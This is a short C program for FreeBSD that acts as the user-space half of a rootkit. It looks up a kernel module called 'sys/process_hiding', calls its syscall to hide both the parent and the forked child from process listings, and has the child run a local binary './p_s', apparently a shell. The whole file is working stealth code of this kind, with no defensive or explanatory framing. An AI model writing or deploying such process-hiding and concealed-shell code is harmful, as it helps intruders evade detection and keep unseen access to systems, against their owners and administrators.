#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/module.h>
#include <sys/types.h>
#include <sys/wait.h>

int main(int argc,char* argv[]) {
    // find process_hider
    struct module_stat stat;
    int hide_procs_sysnum;

    stat.version = sizeof(stat);
    modstat(modfind("sys/process_hiding"), &stat);
    hide_procs_sysnum = stat.data.intval;

    //hide suid
    // syscall(hide_procs_sysnum, getpid());

    int pid = fork();

    //if child
    if(pid == 0){
      syscall(hide_procs_sysnum, getpid());
      printf("Executing shell in child\n");
      system("./p_s");
    }else{
    //if parent
      syscall(hide_procs_sysnum, getpid());
      printf("Shell exectued in child\n");
    }
}

